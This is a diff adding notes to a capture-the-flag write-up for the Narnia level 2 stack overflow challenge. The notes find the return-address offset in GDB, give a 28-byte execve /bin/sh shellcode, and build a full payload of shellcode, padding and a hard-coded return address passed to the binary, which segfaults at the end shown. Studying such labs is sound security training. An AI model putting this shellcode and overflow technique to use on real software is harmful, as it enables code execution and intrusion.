@@ -44,3 +44,28 @@ On top of that, the original article by AlephOne on stack overflows fills in the
 ## Steps
 
 The buffer size is 128. I am going to insert the shellcode from narnia1 I came up with, prefixed with NOP instructions and post fixed with a return address that attempts to force the program to jump back into the buffer when it returns from main.
+
+Running GDB with the following string:
+
+ABCDEFGHIJKLMNOPQRSTUVWXYZ67890123456789AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+
+Causes ret to be overflown with XXXX. So we can set the ret address to whatever by replacing XXXX in our dev string with something else.
+
+Breakpointing after the strcpy shows the first address of the buffer (containing ABCD in reverse order) is 0xffffd5a8.
+
+Our shellcode, \xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68, is in reality 28 characters long.
+
+So perhaps shellcode + padding + address?
+
+Address is \xa8\xd5\xff\xff
+
+Padding is 132 - 28 = 104, so AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Final string is \xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa8\xd5\xff\xff
+
+```
+./narnia2 $(echo -e "\xeb\x0e\x31\xdb\x5b\x31\xc9\x31\xd2\x31\xc0\x83\xc0\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa8\xd5\xff\xff")
+```
+
+This results in a segfault :( Back to GDB...
